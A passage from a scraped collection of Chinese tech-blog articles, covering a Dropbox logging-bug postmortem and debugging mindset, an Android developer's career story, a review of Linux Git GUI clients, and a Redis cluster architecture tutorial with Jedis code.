的行为。我们可以考虑返回400响应，因为这是客户端的问题。但是客户端也无法解决这个问题-如果日志文件现在无法解密，将来也无法解密。因此，我们真正想让客户端做的只是删除日志文件并继续工作。实际上，客户端从服务器获取200响应时默认日志文件存储成功。所以，如果日志文件无法解密，返回200响应就可以了。所有这些bug都很容易修复。前两个错误发生在客户端，所以我们在alpha版本进行修复，但是还没有发布给大多数客户。我们在服务器上修复第三个错误并部署。突然之间，日志集群流量激增。服务团队询问我们是否知道发生了什么事情。我花了一分钟的时间把所有情况放在一起。在这些问题修复之前，四件事情正在发生：日志文件从最老版本开始发送日志文件从最新版本开始删除如果服务器无法解密日志文件，它将返回500响应如果客户端接收到500响应，它将停止发送日志客户端可能会尝试发送损坏的日志文件，服务器返回500响应，客户端放弃发送日志。下一次运行时，它会尝试再次发送相同的文件，再次失败并再次放弃。最终日志目录会变满，客户端将开始删除最新日志文件，并将损坏的日志文件保留在磁盘上。这三个bug的结果是：如果客户端曾经有一个损坏的日志文件，我们将再也看不到来自该客户端的日志文件。问题在于，处于这种状态的客户端比我们想象的要多得多。任何具有单个损坏文件的客户端都无法将日志文件发送到服务器。现在这个问题被解决了，他们都在发送日志目录中的其余内容。我们的选择世界各地的机器会造成很大的流量，我们可以做什么呢？（在与Dropbox规模相当的公司工作是件有趣的事情，特别是Dropbox的桌面客户端规模：你可以轻易地触发自我DDOS）。进行部署时，发现问题的第一个选择是回滚。这是完全合理的选择，但是在这种情况下没有任何帮助。我们要转换的不是服务器上的状态，而是客户端上的状态–我们已经删除了这些文件。回滚服务器将防止其它客户端进入这个状态，但是不能解决问题。增加日志集群的规模可行吗？我们这样做了，并开始接收到更多的请求，现在我们已经进行了扩容。我们又进行了一次扩容，但是不能总这样。为什么不能？这些集群不是隔离的，它将请求另外一个集群(这里是为了处理异常)。如果遇到指向一个集群的DDOS，并且持续扩大集群规模，那么需要解决它们的依赖关系，这样就变成两个问题了。我们考虑的另一个选择是减轻负担-你不需要每个日志文件，所以我们可以放弃请求。这里的一个挑战在于很难确定哪个需要哪个不需要，我们无法快速区分新日志和旧日志。我们确定的解决方案是Dropbox在许多不同场合使用的解决方案：我们有一个自定义标头chillout，所有的客户端都可以接收这个标头。如果客户端接收到包含这个标头的响应，那么它在设定时间内不发送任何请求。有人非常明智的在很早的时候将它添加到Dropbox客户端中，多年来它不止一次派上用场。日志记录服务器无法设置这个标头，但这是一个容易解决的问题。我们的两个同事（IsaacGoldberg和JohnLai）提供了支持。我们首先将日志集群的chillout设置为两分钟，高峰过去几天之后再将其关闭。了解你的系统这个bug的第一个教训是了解你的系统。我头脑中有一个很好的客户端和服务器进行交互的模型。但是，我并没有想到服务器同时与所有客户端交互时会发生什么？这是我从来没有想到过的复杂程度。了解你的工具第二个教训是了解你的工具。如果事情发生了，你可以采取什么措施？你可以反转迁移吗？如果事情发生了，你如何了解它，如何找到更多信息？最好在危机发生之前了解这些内容，如果你没有这样做，你将在危机发生过程中学到，然后永远不会忘记。功能标志位&amp;服务端门控如果写移动或客户端应用，这是第三个教训：需要服务端特性门控和服务端标志位。当你发现一个问题并且无法控制服务端，发布一个新的版本或者向应用商店提交一个新版本可能需要几天甚至几周的时间。那是一种很不好的方法。Dropbox客户端不需要处理应用商店审查流程，但是向几千万客户端推送也需要时间。我们也可以这样解决，出现问题时翻转服务器上的开关然后十分钟解决问题。但是，这个策略也有开销。添加很多标志位会增加代码的复杂度。在测试中会遇到组合问题：如何同时启用了功能A和功能B，或者只有一个，或者一个都不启动—如果具有N个特性则会非常复杂。完成之后请工程师清理功能标志位也将会非常困难（我也犯了这个错误）。对于桌面客户端来讲，可能同时会有很多版本，这将很难处理。但是好处在于—当你需要它们时，你真的非常需要它。如何热爱bugs我谈到了我喜欢的一些bug，并且谈到了为什么热爱这些bug。现在我想告诉你如何去热爱bug。如果你还不喜欢bug，我知道一种学习方式–具有成长思维模式。社会学家CarolDweck在人们如何看待能力方面做过很多有趣的研究。她发现人们使用两种不同的框架认识能力。第一个，她称之为固定思维模式，认为能力是一成不变的，人们无法改变自己的能力。另一个思维模式为成长思维模式，在成长思维模式下，人们认为能力是可塑的，不断的努力可以让能力变得更强。Dweck发现一个人的能力框架-他们持有固定思维模式还是成长思维模式-会非常明显的影响他们选择任务的方式、他们应对挑战的方式、他们的认知表现、甚至他们的诚实。我在KiwiPyCon主题演讲中也谈到了成长思维，下面这些只是部分摘录，你可以阅读完整版本这里关于诚实：之后，他们让学生把这项研究的结果写信告诉笔友：“我们在学校做了这项研究，这是我得到的分数。”他们发现近一半因为聪明被称赞的学生篡改了分数，因为努力工作而受称赞的学生则基本没有不诚实的。关于努力：几项研究发现，有固定思维模式的人可能不愿意付出努力，因为他们认为需要努力意味着他们不擅长正在从事的事情。Dweck指出：“如果每次任务都需要努力，那么很难保持对自己能力的信心，你的能力将会受到质疑。”对混乱的反应：他们发现，不管资料里是否含有混乱的段落，成长思维的学生大约能够掌握资料的70%。固定思维的学生中，如果阅读不包括混乱段落的书，他们也可以掌握资料的70%。但是当固定思维的学生遇到混乱的段落，他们的掌握率下降到30%。固定思维的学生在从混乱恢复过来的过程中会遇到很大的困难。这些发现表明，debug过程中成长思维非常关键。我们需要从混乱过程中恢复过来，对我们理解的局限性保持坦诚，有时找到解决方案的道路真的非常曲折—所有这些，具有成长思维的人更容易处理，遇到痛苦也会少一些。热爱你的bug通过在RecurseCenter工作时的庆祝挑战，我学会了热爱bug。一位参与者会坐到我旁边说：“[叹气]我想我遇到了一个奇怪的Python错误”，我说：“太棒了，我热爱奇怪的Python错误！”首先，这是绝对正确的，但是更重要的是，这强调参与者找出一些他们努力取得成就的东西，完成它对于他们来说是件好事。正如我提到的，RecurseCenter没有截止期限和重要节点，这种环境非常自由。我会说：“你可以花一整天的时间去查找Flask中这个奇怪的bug，多么刺激！”在Dropbox和Pilot，我们要发布产品、有截止日期、有用户，我并不总能花一天的时间解决一个奇怪的bug。因此，我对具有截止日期的现实世界深表同情。但是，如果我有一个需要修复的bug，我必须修复它，抱怨这个错误并不会帮助我更快地修复它。我认为，即使在最终期限的即将到来的时候，你仍然可以持这种态度。如果你热爱bug，在解决棘手问题时可能会获得更多的乐趣。你可能不那么担心并更加专注。最终会从中学到更多。最后，你可以与朋友和同事分享bug，这可以帮助你和你的队友。谢谢感谢那些对这次演讲给我反馈以及帮助我来到这里的朋友：SashaLaundyAmyHanlonJuliaEvansJulianCooperRaphaelPassiniDiniz和PythonBrasil团队的其他成员打赏支持我翻译更多好文章，谢谢！打赏译者打赏支持我翻译更多好文章，谢谢！任选一种支付方式1赞收藏评论关于作者：学以致用123应用软件开发，主要用python、sql个人主页·我的文章·21", "url_object_id": "8537a3c72782bba2e6eee3e4d7202046"},{"title": "一个安卓程序媛的人生经验", "url": "http://blog.jobbole.com/114236/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2012/03/career.jpg"], "praise_nums": 1, "fav_nums": 1, "comments_nums": 0, "tags": "2,0,1,8,/,0,7,/,2,7, ,·", "content": "原文出处：孤独烟引言博主有一个差不多认识了9年的程序媛朋友，从09年读大一开始认识的，现在已经毕业五年，所以相识是九年。目前她就职于网龙、是一个做安卓组件开发的程序媛，已婚。本文基本上反应了她的心酸血泪史，经其同意，整理成文。为了方便描述，下面的第一人称”我”指的就是该妹纸本人。糊里糊涂的大学生涯高考毕业后，也不知道自己的兴趣是啥，稀里糊涂的报了一个专业，最后阴差阳错的来了一个电子类专业。来了这个专业后，发现了一个现象。大部分就读工科专业的妹纸，都是瞎选的，要么就是调剂。基本上，对本专业都缺乏一个了解。而且大部分抱着一个混学历的心态来读，都不知道自己将来要做什么(博主ps：博主明白强迫自己学一个自己不敢兴趣的科目是件多无聊的事情。所以针对这个现象，并不是很排斥，毕竟有些人的家境，并不需要太努力的奋斗。)大一上，无外乎就是一些公共课什么的，计算机一级考的是一些关于word、excel等操作，和编程没有什么关系。所以严格算起来，第一次接触到编程，是在大一下学期的C语言课程。非常有意思的是，没接触过编程的我，最后计算机二级考试居然考了满分。当时，我就明白，我在编程方面有着一种天赋，起码不会排斥。俗话说兴趣是最好的老师对编程有兴趣的我，本来应该在这个领域继续深造。然而在大二和大三并没有接触到其他语言，因此水平一直停滞不前。或许你会说，你可以去自学啊。这里要说一下，我在大学期间的性格是属于一种需要外界给予一定压力和指导，才会去学习。换句话说，如果当初大一下的C语言不需要参加计算机二级考试，我就不会那么努力学习，不会发现自己在编程方面的天赋。因此大二和大三，仅仅满足于上课所传授的知识，沉溺于奖学金的优越感之中。转眼间到了大四，那会是12年。记得11年的时候，NOKIA的塞班机基本上已经退出市场，android那会的火热程度就和现在的微服务一样，于是当时就想着毕业从事一个和android开发相关的工作。由于自己性格的原因，选了一个android的项目作为自己的毕业设计。前面也说了，我需要一定压力来逼迫自己，才会有动力去做。所以在自己没有任何JAVA基础的情况下，选android项目作为自己的毕业设计，也是希望逼迫自己学有所成。这里有一点需要注意，自学过程中最大的敌人，就是寂寞坦白说，在学习过程中，不止一次怕来不及，怕做不出来毕设，怕毕不了业，不止一次动过要去某宝买一个的念头。而且一个人默默的学习，遇到不会的，容易浮躁。当时只有一个信念,我一定能做出来。当一个人的心中有着更高的山峰想去攀登时,他就不会在意脚下的泥沼,他才可能用最平静的方式去面对一般人难以承受的痛苦最后的结果就是，我做出来了，是一个支持各种格式的手机端阅读器。有意思的是，这个项目当时拿到了优秀毕业设计。也因为这个项目找到了工作。(大家想想，面试的时候，直接掏出手机晒自己的项目，比简历上写一堆经验有意义的多了。)懵懵懂懂的工作生涯工作时第一家公司，是一家创业小公司，做的是影城里头的那种，订票的APP。这里有几条经验其实需要和大家进行分享。千万不要有如下想法因为我是女生，所以我编程水平不好也很正常。我是安卓端的，不懂后端知识也没关系坦白说，我很讨厌女生有这种想法。人一旦有了这种想法，就给自己套上了一层枷锁，无法发挥出自己的潜力。我们必须承认一点，人都是有惰性的。而且经常会给自己的懒惰，找寻各种各样的合理的理由。比如，把这个电视剧看完，再开始学习，等等。总之，你只要给自己找了一个这样的理由，每次你偷懒的时候，都会以这种理由给自己洗脑。从此，技术水平止步不前，它会成为你不思进取的借口。或许正是因为，自己没有给自己套上这层枷锁，在毕业后的一年内努力学习，于是跳槽进入了网龙。女程序员在工作过程中，受到优待。网上有一个图很出名，如下所示这个情况在工作中，确实还是存在的。其实可能是因为开发行业，男生比较多的原因，女生会受到优待一些。基本上女程序员遇到问题，一些男程序员会加班给你调BUG，当然加班程度取决于颜值。至于男程序员们遇到问题，那就真的只能靠自己了。但是，大家要注意一些能百度到的问题，就不要去咨询同事这里就不得不说了，有些同事，特别是女同事吧。反正总爱问一些，比如环境怎么搭建这种问题。坦白说，这些问题，你问出去了，只会耽误老员工的时间。人家脾气好，跟你说。遇到一些脾气差的，索性就直接不理你了。总之，予人方便就是予己方便。像一些业务上的知识就是可以去问老员工，千万不要去问一些什么语法啊、环境搭建的问题。做好自己的职业规划男生和女生还是存在着很大的体力差距的，这个不得不承认。包括在很多长辈眼里，都是觉得:”女生嘛，找一个轻松的工作，将来嫁人就好了。”这里我想说的是在当程序员的时候，还是要保持一种学习的热情。就我来说，目前还是这种学习的热情还是没有褪去。如果一旦发现自己的学习热情褪去，就可以思考一下自己是否能在开发的路上走的更远，是不是做管理会更合适呢？不过，不可否认，肯定会有一些直男癌患者，跟你说:”你们女生体力不行啊，什么什么的，就应该去切切图，做做产品啊，什么什么的。”对于这一切质疑，我们要要走自己的路。有一句话叫做行亦禅,坐亦禅,语默动静体安然。大致意思就是，不论你在做什么事,心中感到自在安然，这就是禅。人生有很多痛苦都是因为别人的”中伤”，我们都避免不了心中会有疑虑，只要拥有一颗安详的心，别人就不可能在此作怪。注意护发当程序员后，一定要注意自己的发际线。女生也不例外，大家要注意保养。1赞1收藏评论", "url_object_id": "2c16502f87052a1459d6e26767dc37ac"},{"title": "三款 Linux 下的 Git 图形客户端", "url": "http://blog.jobbole.com/114253/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/08/747d1597878c971c3e72f3c3ce03cde9.jpg"], "praise_nums": 1, "fav_nums": 0, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,0,6, ,·", "content": "原文出处：JackWallen译文出处：Linux中国/tarepanda1024了解这三个Git图形客户端工具如何增强你的开发流程。在Linux下工作的人们对Git非常熟悉。一个理所当然的原因是，Git是我们这个星球上最广为人知也是使用最广泛的版本控制工具。不过大多数情况下，Git需要学习繁杂的终端命令。毕竟，我们的大多数开发工作可能是基于命令行的，那么没理由不以同样的方式与Git交互。但在某些情况下，使用带图形界面的工具可能使你的工作更高效一点（起码对那些更倾向于使用图形界面的人们来说）。那么，有哪些Git图形客户端可供选择呢？幸运的是，我们找到一些客户端值得你花费时间和金钱（一些情况下）去尝试一下。在此，我主要推荐三种可以运行在Linux操作系统上的Git客户端。在这几种中，你可以找到一款满足你所有要求的客户端。在这里我假设你理解如何使用Git和具有GitHub类似功能的代码仓库，使用方法我之前讲过了，因此我不再花费时间讲解如何使用这些工具。本篇文章主要是一篇介绍，介绍几种可以用在开发任务中的工具。提前说明一下：这些工具并不都是免费的，它们中的一些可能需要商业授权。不过，它们都在Linux下运行良好并且可以轻而易举的和GitHub相结合。就说这些了，快让我们看看这些出色的Git图形客户端吧。SmartGitSmartGit是一个商业工具，不过如果你在非商业环境下使用是免费的。如果你打算在商业环境下使用的话，一个许可证每人每年需要99美元，或者5.99美元一个月。还有一些其它升级功能（比如分布式评审DistributedReviews和智能同步SmartSynchronize），这两个工具每个许可证需要另加15美元。你也能通过下载源码或者deb安装包进行安装。我在Ubuntu18.04下测试，发现SmartGit运行良好，没有出现一点问题。不过，我们为什么要用SmartGit呢？有许多原因，最重要的一点是，SmartGit可以非常方便的和GitHub以及Subversion等版本控制工具整合。不需要你花费宝贵的时间去配置各种远程账号，SmartGit的这些功能开箱即用。SmartGit的界面（图1）设计的也很好，整洁直观。图1:SmartGit帮助简化工作安装完SmartGit后，我马上就用它连接到了我的GitHub账户。默认的工具栏是和仓库操作相关联的，非常简洁。推送、拉取、检出、合并、添加分支、cherrypick、撤销、变基、重置——　这些Git的的流行功能都支持。除了支持标准Git和GitHub的大部分功能，SmartGit运行也非常稳定。至少当你在Ubuntu上使用时，你会觉得这一款软件是专门为Linux设计和开发的。SmartGit可能是使各个水平的Git用户都可以非常轻松的使用Git，甚至Git高级功能的最好工具。为了了解更多SmartGit相关知识，你可以查看一下其丰富的文档。GitKrakenGitKraken是另外一款商业Git图形客户端，它可以使你感受到一种绝不会后悔的使用Git或者GitHub的美妙体验。SmartGit具有非常简洁的界面，而GitKraken拥有非常华丽的界面，它一开始就给你展现了很多特色。GitKraken有一个免费版（你也可以使用完整版15天）。试用期过了，你也可以继续使用免费版，不过不能用于商业用途。对那些想让其开发工作流发挥最大功效的人们来说，GitKraken可能是一个比较好的选择。界面上具有的功能包括：可视化交互、可缩放的提交图、拖拽、与Github、GitLab和BitBucked的无缝整合、简单的应用内任务清单、应用内置的合并工具、模糊查找、支持Gitflow、一键撤销与重做、快捷键、文件历史与追责、子模块、亮色和暗色主题、Git钩子支持和GitLFS等许多功能。不过用户倍加赞赏的还是精美的界面（图2)。图2:GitKraken的界面非常出色除了令人惊艳的图形界面，另一个使GitKraken在Git图形客户端竞争中脱颖而出的功能是：GitKraken使得使用多个远程仓库和多套配置变得非常简单。不过有一个告诫，使用GitKraken需要花钱（它是专有的）。如果你想商业使用，许可证的价钱如下：一人一年49美元10人以上团队，39美元每人每年100人以上团队，29美元每人每年专业版账户不但可以在商业环境使用Git相关功能，还可以使用GloBoards（GitKraken的项目管理工具）。GloBoards的一个吸引人的功能是可以将数据同步到GitHub工单Issues。GloBoards具有分享功能还具有搜索过滤、问题跟踪、Markdown支持、附件、＠功能、清单卡片等许多功能。所有的这些功能都可以在GitKraken界面里进行操作。GitKraken可以通过deb文件或者源码进行安装。GitColaGitCola是我们推荐列表中一款自由开源的Git图像客户端。不像GitKraken和SmartGit，GitCola是一款比较难啃的骨头，一款比较实用的Git客户端。GitCola是用Python写成的，使用的是GTK界面，因此无论你用的是什么Linux发行版和桌面，都可以无缝支持。并且因为它是开源的，你可以在你使用的发行版的包管理器中找到它。因此安装过程无非是打开应用商店，搜索“GitCola”安装即可。你也可以通过下面的命令进行安装：sudoaptinstallgit-cola12sudoaptinstallgit-cola或者sudodnfinstallgit-cola12sudodnfinstallgit-colaGitCola看起来相对比较简单（图3）。事实上，你无法找到更复杂的东西，因为GitCola是非常基础的。图3：GitCola界面是非常简单的因为GitCola看起来回归自然，所以很多时间你必须同终端打交道。不过这并不是什么难事儿（因为大多数开发人员需要经常使用终端）。GitCola包含以下特性：支持多个子命令自定义窗口设置可设置环境变量语言设置支持自定义GUI设置支持快捷键尽管GitCola支持连接到远程仓库，但和像GitHub这样的仓库整合看起来也没有GitKraken和SmartGit直观。不过如果你的大部分工作是在本地进行的，GitCola并不失为一个出色的工具。GitCola也带有有一个高级的DAG（有向无环图）可视化工具，叫做GitDAG。这个工具可以使你获得分支的可视化展示。你可以独立使用GitDAG，也可以在GitCola内通过“view-&gt;DAG”菜单来打开。正是GitDAG这个威力巨大的工具使用GitCola跻身于应用商店中Git图形客户端前列。更多的客户端还有更多的Git图形客户端。不过，从上面介绍的这几款中，你已经可以做很多事情了。无论你在寻找一款更有丰富功能的Git客户端（不管许可证的话）还是你本身是一名坚定的GPL支持者，都可以从上面找到适合自己的一款。如果想学习更多关于Linux的知识，可以通过学习Linux基金会的走进Linux课程。1赞收藏评论", "url_object_id": "30deea10612c98fadc6470a7bb44998e"},{"title": "Redis 架构演变与 Redis-cluster 群集读写方案", "url": "http://blog.jobbole.com/114270/", "create_date": "2018-09-13", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/04/49961db8952e63d98b519b76a2daa5e2.png"], "praise_nums": 2, "fav_nums": 2, "comments_nums": 0, "tags": "2,0,1,8,/,0,8,/,1,4, ,·", "content": "原文出处：PingLee导言Redis-cluster是近年来Redis架构不断改进中的相对较好的Redis高可用方案。本文涉及到近年来Redis多实例架构的演变过程，包括普通主从架构（Master、slave可进行写读分离）、哨兵模式下的主从架构、Redis-cluster高可用架构（Redis官方默认cluster下不进行读写分离）的简介。同时还介绍使用Java的两大redis客户端：Jedis与Lettuce用于读写redis-cluster的数据的一般方法。再通过官方文档以及互联网的相关技术文档，给出redis-cluster架构下的读写能力的优化方案，包括官方的推荐的扩展redis-cluster下的Master数量以及非官方默认的redis-cluster的读写分离方案，案例中使用Lettuce的特定方法进行redis-cluster架构下的数据读写分离。近年来redis多实例用架构的演变过程redis是基于内存的高性能key-value数据库，若要让redis的数据更稳定安全，需要引入多实例以及相关的高可用架构。而近年来redis的高可用架构亦不断改进，先后出现了本地持久化、主从备份、哨兵模式、redis-cluster群集高可用架构等等方案。1、redis普通主从模式通过持久化功能，Redis保证了即使在服务器重启的情况下也不会损失（或少量损失）数据，因为持久化会把内存中数据保存到硬盘上，重启会从硬盘上加载数据。。但是由于数据是存储在一台服务器上的，如果这台服务器出现硬盘故障等问题，也会导致数据丢失。为了避免单点故障，通常的做法是将数据库复制多个副本以部署在不同的服务器上，这样即使有一台服务器出现故障，其他服务器依然可以继续提供服务。为此，Redis提供了复制（replication）功能，可以实现当一台数据库中的数据更新后，自动将更新的数据同步到其他数据库上。在复制的概念中，数据库分为两类，一类是主数据库（master），另一类是从数据库（slave）。主数据库可以进行读写操作，当写操作导致数据变化时会自动将数据同步给从数据库。而从数据库一般是只读的，并接受主数据库同步过来的数据。一个主数据库可以拥有多个从数据库，而一个从数据库只能拥有一个主数据库。主从模式的配置，一般只需要再作为slave的redis节点的conf文件上加入“slaveofmasteripmasterport”，或者作为slave的redis节点启动时使用如下参考命令：redis-server--port6380--slaveofmasterIpmasterPort1redis-server--port6380--slaveofmasterIpmasterPortredis的普通主从模式，能较好地避免单独故障问题，以及提出了读写分离，降低了Master节点的压力。互联网上大多数的对redis读写分离的教程，都是基于这一模式或架构下进行的。但实际上这一架构并非是目前最好的redis高可用架构。2、redis哨兵模式高可用架构当主数据库遇到异常中断服务后，开发者可以通过手动的方式选择一个从数据库来升格为主数据库，以使得系统能够继续提供服务。然而整个过程相对麻烦且需要人工介入，难以实现自动化。为此，Redis2.8开始提供了哨兵工具来实现自动化的系统监控和故障恢复功能。哨兵的作用就是监控redis主、从数据库是否正常运行，主出现故障自动将从数据库转换为主数据库。顾名思义，哨兵的作用就是监控Redis系统的运行状况。它的功能包括以下两个。（1）监控主数据库和从数据库是否正常运行。（2）主数据库出现故障时自动将从数据库转换为主数据库。可以用inforeplication查看主从情况例子：1主2从1哨兵,可以用命令起也可以用配置文件里可以使用双哨兵，更安全，参考命令如下：redis-server--port6379redis-server--port6380--slaveof192.168.0.1676379redis-server--port6381--slaveof192.168.0.1676379redis-sentinelsentinel.conf1234redis-server--port6379redis-server--port6380--slaveof192.168.0.1676379redis-server--port6381--slaveof192.168.0.1676379redis-sentinelsentinel.conf其中，哨兵配置文件sentinel.conf参考如下：sentinelmonitormymaster192.168.0.167637911sentinelmonitormymaster192.168.0.16763791其中mymaster表示要监控的主数据库的名字。配置哨兵监控一个系统时，只需要配置其监控主数据库即可，哨兵会自动发现所有复制该主数据库的从数据库。Master与slave的切换过程：（1）slaveleader升级为master（2）其他slave修改为新master的slave（3）客户端修改连接（4）老的master如果重启成功，变为新master的slave3、redis-cluster群集高可用架构即使使用哨兵，redis每个实例也是全量存储，每个redis存储的内容都是完整的数据，浪费内存且有木桶效应。为了最大化利用内存，可以采用cluster群集，就是分布式存储。即每台redis存储不同的内容。采用redis-cluster架构正是满足这种分布式存储要求的集群的一种体现。redis-cluster架构中，被设计成共有16384个hashslot。每个master分得一部分slot，其算法为：hash_slot=crc16(key)mod16384，这就找到对应slot。采用hashslot的算法，实际上是解决了redis-cluster架构下，有多个master节点的时候，数据如何分布到这些节点上去。key是可用key，如果有{}则取{}内的作为可用key，否则整个可以是可用key。群集至少需要3主3从，且每个实例使用不同的配置文件。在redis-cluster架构中，redis-master节点一般用于接收读写，而redis-slave节点则一般只用于备份，其与对应的master拥有相同的slot集合，若某个redis-master意外失效，则再将其对应的slave进行升级为临时redis-master。在redis的官方文档中，对redis-cluster架构上，有这样的说明：在cluster架构下，默认的，一般redis-master用于接收读写，而redis-slave则用于备份，当有请求是在向slave发起时，会直接重定向到对应key所在的master来处理。但如果不介意读取的是redis-cluster中有可能过期的数据并且对写请求不感兴趣时，则亦可通过readonly命令，将slave设置成可读，然后通过slave获取相关的key，达到读写分离。具体可以参阅redis官方文档（https://redis.io/commands/readonly）等相关内容：EnablesreadqueriesforaconnectiontoaRedisClusterslavenode.Normallyslavenodeswillredirectclientstotheauthoritativemasterforthehashslotinvolvedinagivencommand,howeverclientscanuseslavesinordertoscalereadsusingtheREADONLYcommand.READONLYtellsaRedisClusterslavenodethattheclientiswillingtoreadpossiblystaledataandisnotinterestedinrunningwritequeries.Whentheconnectionisinreadonlymode,theclusterwillsendaredirectiontotheclientonlyiftheoperationinvolveskeysnotservedbytheslave'smasternode.Thismayhappenbecause:Theclientsentacommandabouthashslotsneverservedbythemasterofthisslave.Theclusterwasreconfigured(forexampleresharded)andtheslaveisnolongerabletoservecommandsforagivenhashslot.123456EnablesreadqueriesforaconnectiontoaRedisClusterslavenode.Normallyslavenodeswillredirectclientstotheauthoritativemasterforthehashslotinvolvedinagivencommand,howeverclientscanuseslavesinordertoscalereadsusingtheREADONLYcommand.READONLYtellsaRedisClusterslavenodethattheclientiswillingtoreadpossiblystaledataandisnotinterestedinrunningwritequeries.Whentheconnectionisinreadonlymode,theclusterwillsendaredirectiontotheclientonlyiftheoperationinvolveskeysnotservedbytheslave'smasternode.Thismayhappenbecause:Theclientsentacommandabouthashslotsneverservedbythemasterofthisslave.Theclusterwasreconfigured(forexampleresharded)andtheslaveisnolongerabletoservecommandsforagivenhashslot.例如，我们假设已经建立了一个三主三从的redis-cluster架构，其中A、B、C节点都是redis-master节点，A1、B1、C1节点都是对应的redis-slave节点。在我们只有master节点A，B，C的情况下，对应redis-cluster如果节点B失败，则群集无法继续，因为我们没有办法再在节点B的所具有的约三分之一的hashslot集合范围内提供相对应的slot。然而，如果我们为每个主服务器节点添加一个从服务器节点，以便最终集群由作为主服务器节点的A，B，C以及作为从服务器节点的A1，B1，C1组成，那么如果节点B发生故障，系统能够继续运行。节点B1复制B，并且B失效时，则redis-cluster将促使B的从节点B1作为新的主服务器节点并且将继续正确地操作。但请注意，如果节点B和B1在同一时间发生故障，则Redis群集无法继续运行。Redis群集配置参数:在继续之前，让我们介绍一下RedisCluster在redis.conf文件中引入的配置参数。有些命令的意思是显而易见的，有些命令在你阅读下面的解释后才会更加清晰。（1）cluster-enabled：如果想在特定的Redis实例中启用Redis群集支持就设置为yes。否则，实例通常作为独立实例启动。（2）cluster-config-file：请注意，尽管有此选项的名称，但这不是用户可编辑的配置文件，而是Redis群集节点每次发生更改时自动保留群集配置（基本上为状态）的文件。（3）cluster-node-timeout：Redis群集节点可以不可用的最长时间，而不会将其视为失败。如果主节点超过指定的时间不可达，它将由其从属设备进行故障切换。（4）cluster-slave-validity-factor：如果设置为0，无论主设备和从设备之间的链路保持断开连接的时间长短，从设备都将尝试故障切换主设备。如果该值为正值，则计算最大断开时间作为节点超时值乘以此选项提供的系数，如果该节点是从节点，则在主链路断开连接的时间超过指定的超时值时，它不会尝试启动故障切换。（5）cluster-migration-barrier：主设备将保持连接的最小从设备数量，以便另一个从设备迁移到不受任何从设备覆盖的主设备。有关更多信息，请参阅本教程中有关副本迁移的相应部分。（6）cluster-require-full-coverage：如果将其设置为yes，则默认情况下，如果key的空间的某个百分比未被任何节点覆盖，则集群停止接受写入。如果该选项设置为no，则即使只处理关于keys子集的请求，群集仍将提供查询。以下是最小的Redis集群配置文件：port7000cluster-enabledyescluster-config-filenodes.confcluster-node-timeout5000appendonlyyes12345port7000cluster-enabledyescluster-config-filenodes.confcluster-node-timeout5000appendonlyyes注意：（1）redis-cluster最小配置为三主三从，当1个主故障，大家会给对应的从投票，把从立为主，若没有从数据库可以恢复则redis群集就down了。（2）在这个rediscluster中，如果你要在slave读取数据，那么需要带上readonly指令。rediscluster的核心的理念，主要是用slave做高可用的，每个master挂一两个slave，主要是做数据的热备，当master故障时的作为主备切换，实现高可用的。rediscluster默认是不支持slave节点读或者写的，跟我们手动基于replication搭建的主从架构不一样的。slavenode要设置readonly，然后再get，这个时候才能在slavenode进行读取。对于redis-cluster主从架构，若要进行读写分离，官方其实是不建议的，但也能做，只是会复杂一些。具体见下面的章节。（3）redis-cluster的架构下，实际上本身master就是可以任意扩展的，你如果要支撑更大的读吞吐量，或者写吞吐量，或者数据量，都可以直接对master进行横向扩展就可以了。也扩容master，跟之前扩容slave进行读写分离，效果是一样的或者说更好。（4）可以使用自带客户端连接：使用redis-cli-c-pcluster中任意一个端口，进行数据获取测试。Java中对redis-cluster数据的一般读取方法简介使用Jedis读写redis-cluster的数据由于Jedis类一般只能对一台redis-master进行数据操作，所以面对redis-cluster多台master与slave的群集，Jedis类就不能满足了。这个时候我们需要引用另外一个操作类：JedisCluster类。例如我们有6台机器组成的redis-cluster：172.20.52.85:7000、172.20.52.85:7001、172.20.52.85:7002、172.20.52.85:7003、172.20.52.85:7004、172.20.52.85:7005其中master机器对应端口：7000、7004、7005slave对应端口：7001、7002、7003使用JedisCluster对redis-cluster进行数据操作的参考代码如下：//添加nodes服务节点到Set集合Set&lt;HostAndPort&gt;hostAndPortsSet=newHashSet&lt;HostAndPort&gt;();//添加节点hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7000));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7001));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7002));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7003));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7004));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7005));//Jedis连接池配置JedisPoolConfigjedisPoolConfig=newJedisPoolConfig();jedisPoolConfig.setMaxIdle(100);jedisPoolConfig.setMaxTotal(500);jedisPoolConfig.setMinIdle(0);jedisPoolConfig.setMaxWaitMillis(2000);//设置2秒jedisPoolConfig.setTestOnBorrow(true);JedisClusterjedisCluster=newJedisCluster(hostAndPortsSet,jedisPoolConfig);Stringresult=jedisCluster.get(\"event:10\");System.out.println(result);123456789101112131415161718192021//添加nodes服务节点到Set集合Set&lt;HostAndPort&gt;hostAndPortsSet=newHashSet&lt;HostAndPort&gt;();//添加节点hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7000));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7001));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7002));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7003));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7004));hostAndPortsSet.add(newHostAndPort(\"172.20.52.85\",7005));//Jedis连接池配置JedisPoolConfigjedisPoolConfig=newJedisPoolConfig();jedisPoolConfig.setMaxIdle(100);jedisPoolConfig.setMaxTotal(500);jedisPoolConfig.setMinIdle(0);jedisPoolConfig.setMaxWaitMillis(2000);//设置2秒jedisPoolConfig.setTestOnBorrow(true);JedisClusterjedisCluster=newJedisCluster(hostAndPortsSet,jedisPoolConfig);Stringresult=jedisCluster.get(\"event:10\");System.out.println(result);运行结果截图如下图所示：第一节中我们已经介绍了redis-cluster架构下master提供读写功能，而slave一般只作为对应master机器的数据备份不提供读写。如果我们只在hostAndPortsSet中只配置slave，而不配置master，实际上还是可以读到数据，但其内部操作实际是通过slave重定向到相关的master主机上，然后再将结果获取和输出。上面是普